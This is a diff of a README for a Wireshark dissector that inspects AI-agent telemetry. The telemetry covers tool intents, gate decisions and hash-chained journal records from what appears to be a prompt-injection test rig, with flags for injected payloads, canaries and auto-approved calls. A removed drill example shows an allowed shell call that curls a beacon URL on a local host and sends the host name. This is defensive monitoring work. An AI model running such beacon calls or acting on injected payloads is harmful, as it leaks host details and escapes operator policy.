@@ -1,6 +1,6 @@
 # Wireshark Monitoring for Forensic-Grade Agent Telemetry (FGAT)
 
-This directory contains the Wireshark Lua dissector and PCAP artifacts for inspecting the **10-field Decision-Turn Provenance Tuple** in real time or post-incident.
+This directory contains the Wireshark Lua dissector for the collector's **operational mirror**: one UDP datagram per journal record, carrying that record's operational event (schema: [`collector/SCHEMA.md`](../collector/SCHEMA.md)). The dissector also reads the Volume 1 full-record format in `fgat_drill.pcap`.
 
 [![Protocol: FGAT](https://img.shields.io/badge/Protocol-FGAT%20(UDP%209999)-blue.svg)](https://securitysonar.com)
 [![Wireshark: Lua Dissector](https://img.shields.io/badge/Wireshark-Lua%20Dissector-green.svg)](https://www.wireshark.org)
@@ -9,84 +9,99 @@ This directory contains the Wireshark Lua dissector and PCAP artifacts for inspe
 
 ## Why Monitor Agent Telemetry with Wireshark?
 
-Traditional host EDR and SIEM platforms see application executions as generic process spawns (`python3` -> `curl`). 
-By streaming the **Operational Plane** over UDP (port `9999`) and capturing it in standard PCAP format:
-1. **The Wire Doesn't Lie:** Network packets provide an unalterable, independent witness to every agent decision.
-2. **Standard DFIR Tooling:** Analysts and incident responders can triage agent behavior in the exact same packet analysis tool they use for enterprise network forensics.
-3. **Structured Protocol Tree:** The custom Wireshark Lua dissector (`fgat_dissector.lua`) unpacks the raw JSON provenance payload into discrete, filterable protocol fields.
+Traditional host EDR and SIEM platforms see application executions as generic process spawns (`python3` -> `curl`).
+The collector mirrors each operational event over UDP (port `9999`), byte-identical to the line it writes to the operational file:
+1. **A second copy of the anchor:** every event carries the journal record's `block_hash`. A capture stored off the host is an independent copy of the hash sequence that `collector_daemon.py --verify --anchor` checks the journal against. A capture on the same host is only as trustworthy as that host.
+2. **Metadata only:** tool names, decisions, window flags, sizes, and hashes. Tool arguments, model text, and content stay on the evidentiary plane.
+3. **Standard DFIR tooling:** responders can triage agent behavior in the same packet analysis tools they use for network forensics.
 
 ---
 
 ## Wireshark Protocol Dissection Tree
 
-When a packet is selected in Wireshark, the `FGAT` dissector expands into five forensic sections:
+Two events from the first Volume 2 pilot, as dissected:
 
 ```text
-▼ Forensic-Grade Agent Telemetry, Turn 5: execute_shell [ALLOW]
-  ▼ 1. Agent Identity & Serving Metadata
-      Session ID: sess-fgat-drill-8812
-      Turn ID: 5
-      Timestamp (UTC): 2026-09-20T14:20:01.812491Z
-      Model Name: nemotron-3-super
-      Model Provider: dgx-spark-local
-  ▼ 2. System Instructions & Context State
-      System Prompt Hash (SHA-256): a3f89c02e148bd918402918401928401...
-      Context Compacted: True
-      [Expert Info (Warning/Security): Context auto-compaction occurred in this turn! Input prompt may be evicted.]
-  ▼ 3. Untrusted Ingress Artifacts (1 object)
-      Ingress Artifact Count: 1
-      ▼ Artifact #1: docs/internals/architecture.md
-          Ingress Source: docs/internals/architecture.md
-          Ingress SHA-256: 69335b279b02c234a98a07b8b2fe177a7ae7cce68c8c5a8fc50f2fb983f390fc
-  ▼ 4. Tool Execution Boundary & Gate Verdict
-      Tool Manifest Hash (SHA-256): manifest-hash-abc123...
-      Proposed Tool: execute_shell
-      Tool Parameters: curl -s http://192.168.1.50:8000/telemetry-beacon?host=dgx-spark-node1
-      Gate Verdict: ALLOW
-      Gate Rule ID: DEFAULT_SHELL_PERMIT
-      Execution Exit Code: 0
-  ▼ 5. Evidentiary Hash Chain (Non-Repudiation)
-      Previous Block Hash: f891b2c4...
-      Current Block Hash:  a4b89f21c990...
+Forensic-Grade Agent Telemetry, model_turn, turn 2
+    Record
+        Session ID: bbx-smoke-V2A-781a4c
+        Sequence: 6
+        Record Kind: model_turn
+        Turn: 2
+        Sender Time: 1791460143.526484
+    Model Turn
+        Model Latency (s): 27.12
+        Proposed Tool Calls: update_progress
+        Window Trimmed: False
+        Injected Payload in Window: True
+        Canary in Window: True
+        [Expert Info (Note/Security): Injected payload is in the model's window]
+    Collector
+        Collector Ingest Time (UTC): 2026-10-22T12:20:50.276985+00:00
+        Sender UID: 1000
+        Block Hash: a4fbe99b9e1b6135ab7dcbdb676d96a13cfc0c80de6254b079708fa154b0da2f
+
+Forensic-Grade Agent Telemetry, intent, turn 14
+    Record
+        Session ID: bbx-smoke-V2A-781a4c
+        Sequence: 51
+        Record Kind: intent
+        Turn: 14
+        Sender Time: 1791460234.686030
+    Tool Intent
+        Tool: run
+        Classification: ask
+        Decision Branch: auto_approve
+        Allowed: True
+        [Expert Info (Note/Security): Allowed by auto-approve, not by policy: run (classify=ask)]
+    Collector
+        Collector Ingest Time (UTC): 2026-10-22T12:20:50.780966+00:00
+        Sender UID: 1000
+        Block Hash: 14a8b405fb58addc3d05ce9cf67e39b29b3d605d10069b01be11707d04023097
 ```
 
+Expert info: refused tool calls (Security/Warning), calls allowed by auto-approve rather than policy (Security/Note), injected payload in the model's window (Security/Note), trimmed window (Sequence/Note), unknown record kind or missing `block_hash` (Malformed).
+
 ---
+
+## Fixtures
+
+- `fgat_pilot_operational.pcap`: a real `tcpdump -i lo udp port 9999` capture of the operational mirror while both Volume 2 pilot journals were replayed through the collector (`experiments/rig_fgat/collector_tests/capture_pilot_mirror.py`). The regression tests check every field against the captured payloads.
+- `fgat_drill.pcap`: see below. Synthetic, Volume 1 format.
 
 ## Quickstart: Inspecting the Drill PCAP
 
 A synthetic drill file of the full 5-turn attack trajectory is included in this directory: `fgat_drill.pcap`. It was generated by `pcap_writer.py`, not captured from a network: every frame carries source port 54321 and IP ID 54321, and the payloads are full evidentiary records in the original schema. Use it to try the dissector, not as evidence. The collector no longer writes pcap files (`--pcap` was removed); for a real capture of the operational mirror, see the live section below.
 
-### Launch Wireshark with the FGAT Dissector
-
-Run from the root of the repository:
-
 ```bash
-wireshark -X lua_script:wireshark/fgat_dissector.lua wireshark/fgat_drill.pcap
-```
-
-Or using `tshark` in the terminal:
-
-```bash
+tshark -X lua_script:wireshark/fgat_dissector.lua -r wireshark/fgat_pilot_operational.pcap
 tshark -X lua_script:wireshark/fgat_dissector.lua -r wireshark/fgat_drill.pcap -V
 ```
 
----
+Run the regression tests from the repository root (needs `tshark`):
+
+```bash
+python3 wireshark/test_dissector.py
+```
 
 ## Wireshark Display Filters
 
-With `fgat_dissector.lua` loaded, you can filter packets using native Wireshark syntax:
+With `fgat_dissector.lua` loaded:
 
 | Display Filter | Purpose |
 |---|---|
-| `fgat.turn_id == 5` | Isolate specific decision turn |
-| `fgat.compacted == 1` | Filter turns where context auto-compaction occurred |
-| `fgat.tool_name == "execute_shell"` | Isolate all shell execution tool attempts |
-| `fgat.gate_verdict == "allow"` | Filter approved tool actions |
-| `fgat.gate_verdict == "deny"` | Filter blocked / unauthorized tool executions |
-| `fgat.ingress_sha256 contains "69335b27"` | Trace every turn that touched a specific file hash |
-| `fgat.session_id == "sess-fgat-drill-8812"` | Isolate an entire agent session |
-| `_ws.expert.group == "Security"` | Filter all security alerts (compaction eviction or gate blocks) |
-| `_ws.expert.group == "Malformed"` | Detect malformed / corrupted FGAT datagrams |
+| `fgat.session_id == "bbx-smoke-V2A-781a4c"` | One session |
+| `fgat.kind == "intent"` | Tool calls as proposed and decided |
+| `fgat.kind == "intent" && fgat.allowed == 0` | Refused tool calls |
+| `fgat.branch == "auto_approve"` | Calls allowed by auto-approve rather than policy |
+| `fgat.tool == "run"` | Shell commands (intents and results) |
+| `fgat.payload_in_window == 1` | Model turns with the injected payload in the window |
+| `fgat.trimmed == 1` | Model turns where older messages were trimmed |
+| `fgat.block_hash contains "a4fbe99b"` | Find the event for a journal record |
+| `_ws.expert.group == "Security"` | Refusals, auto-approvals, payload in window |
+| `_ws.expert.group == "Malformed"` | Corrupted or unrecognized FGAT datagrams |
+
+Volume 1 records use the same names where the meaning is the same (`fgat.turn`, `fgat.tool`, `fgat.classify` for the gate verdict, `fgat.rule_id`, `fgat.exit_code`, `fgat.block_hash`); fields only that format has are under `fgat.v1.*` (e.g. `fgat.v1.compacted == 1`, `fgat.v1.ingress_sha256 contains "69335b27"`).
 
 ---
 
@@ -94,15 +109,15 @@ With `fgat_dissector.lua` loaded, you can filter packets using native Wireshark 
 
 To monitor agent telemetry live as it executes:
 
-### Method 1: Zero-Privilege Live Monitor (`live_monitor.py`)
-Stream mirrored UDP packets directly into `tshark` without requiring `root`, `sudo`, or BPF capture device permissions:
+### Method 1: Zero-Privilege Live Viewer (`live_monitor.py`)
+Receive the mirror on a socket and stream it into `tshark` without `root` or BPF permissions. This is a viewer: the frames tshark shows are built around the received payloads, so it can't save a capture. Use Method 2 for that.
 
 ```bash
 # Terminal 1: Launch live monitor
 python3 wireshark/live_monitor.py
 
 # Optional: Add display filters or full verbose trees
-python3 wireshark/live_monitor.py -V -Y 'fgat.gate_verdict == "deny"' --save /tmp/session.pcap
+python3 wireshark/live_monitor.py -V -Y 'fgat.kind == "intent" && fgat.allowed == 0'
 ```
 
 ### Method 2: Kernel Packet Capture (Root / BPF)
@@ -112,11 +127,11 @@ If capturing with root or system packet capture tools:
 python3 collector/collector_daemon.py --udp-mirror 127.0.0.1:9999
 
 # 2. Sniff live UDP packets on loopback:
-tcpdump -i lo -nn -s0 -w /tmp/live_fgat.pcap port 9999
+tcpdump -i lo -nn -s0 -U -w /tmp/live_fgat.pcap udp port 9999
 ```
 
 ### Method 3: Stream Remotely to Your Workstation Wireshark
-If running the DGX Spark remotely, set `--udp-mirror <your-workstation-ip>:9999` and start Wireshark on your local machine capturing on UDP port 9999. Every decision turn will appear in your live packet stream in real time.
+If running the DGX Spark remotely, set `--udp-mirror <your-workstation-ip>:9999` and start Wireshark on your local machine capturing on UDP port 9999. Every journal record's operational event will appear in your live packet stream in real time.
 
 ---
 
